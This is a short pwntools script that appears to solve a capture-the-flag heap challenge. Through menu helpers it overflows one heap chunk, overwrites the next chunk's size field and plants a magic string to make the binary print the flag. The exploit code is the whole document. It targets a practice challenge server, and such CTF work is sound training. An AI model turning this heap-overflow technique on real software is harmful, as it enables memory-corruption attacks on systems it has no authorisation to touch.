#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'mitigations-are-awesome.ctf.umasscybersec.org', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x04019c5
break *0x0401afa
break *0x0401c23
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def create(size):
    io.sendlineafter(b'?', b'1')
    io.sendlineafter(b'?', str(size).encode())

def resize(idx, new_size):
    io.sendlineafter(b'?', b'2')
    io.sendlineafter(b'?', str(idx).encode())
    io.sendlineafter(b'?', str(new_size).encode())

def edit(idx, len, data):
    io.sendlineafter(b'?', b'3')
    io.sendlineafter(b'?', str(idx).encode())
    io.sendlineafter(b'?', str(len).encode())
    io.sendlineafter(b'?', data)

def get_flag():
    io.sendlineafter(b'?', b'4')

def exploit():
    global io
    io = initialize()

    create(0x20)
    create(0x20)
    create(0x10)
    resize(1, 0x40)

    payload = b''
    payload += b'A' * 0x28
    payload += p64(0x31)
    payload += b'Ez W\x00'
    edit(0, 0x100, payload)

    get_flag()

    io.interactive()
    
if __name__ == '__main__':
    exploit()